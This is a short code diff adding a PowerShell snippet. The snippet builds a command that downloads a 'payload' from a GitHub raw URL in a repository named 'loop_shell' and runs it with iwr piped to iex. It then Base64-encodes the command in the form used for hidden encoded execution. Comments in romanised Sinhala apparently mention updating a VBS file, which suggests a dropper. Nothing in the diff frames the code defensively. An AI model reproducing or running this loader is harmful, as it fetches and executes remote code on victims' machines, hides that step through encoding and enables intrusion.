@@ -1,0 +1,6 @@
+$command = 'Write-Host "Connecting..."; iwr https://raw.githubusercontent.com/anaprivate/loop_shell/main/payload -UseBasicParsing | iex; Write-Host "Done"'
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+[Convert]::ToBase64String($bytes)
+
+\\dn nikn wad krn na e nis command ek encode krl dannone 
+\\vbs file ek update kra
